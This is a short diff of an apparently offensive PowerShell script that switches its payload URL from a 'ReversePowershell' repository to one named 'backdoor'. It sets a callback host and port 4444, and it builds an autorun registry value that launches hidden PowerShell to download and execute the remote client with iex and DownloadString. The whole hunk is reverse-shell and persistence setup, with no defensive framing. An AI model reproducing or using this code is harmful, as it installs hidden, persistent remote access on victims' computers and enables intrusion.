@@ -3,7 +3,7 @@
 
 $address = '192.168.1.200'
 $port = 4444
-$scriptURL = 'https://raw.githubusercontent.com/sweetsoftware/ReversePowershell/master/client.ps1'
+$scriptURL = 'https://raw.githubusercontent.com/cyberhunter00/backdoor/master/client_powershell.ps1'
 $autorunKeyName = "Windows Powershell"
 $autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'
 
